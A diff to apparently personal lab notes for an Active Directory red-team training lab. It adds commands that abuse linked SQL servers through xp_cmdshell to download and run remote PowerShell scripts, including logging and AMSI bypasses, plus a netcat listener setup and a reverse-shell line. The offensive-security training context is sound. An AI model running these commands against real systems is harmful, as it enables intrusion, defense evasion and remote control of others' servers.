@@ -35,3 +35,20 @@ Let's try to execute a PowerShell download execute cradle to execute a PowerShel
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.13:9898/Invoke-PowerShellTcpEx.ps1'')"' -QueryTarget eu-sql
 ```
 
+
+
+<figure><img src="../../.gitbook/assets/image (1180).png" alt=""><figcaption></figcaption></figure>
+
+```
+ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.13:5555/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.13:5555/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.13:5555/Invoke-PowerShellTcp.ps1)"''' -QueryTarget eu-sql13
+```
+
+{% hint style="danger" %}
+Don't forget to set up a listener using wsl (here on port 5555), set up a listener with netcat (here on port 443) and inside  /Invoke-PowerShellTcp.ps1 put this line:
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/image (1182).png" alt=""><figcaption></figcaption></figure>
+
+```
+Power -Reverse -IPAddress 172.16.100.13 -Port 443
+```
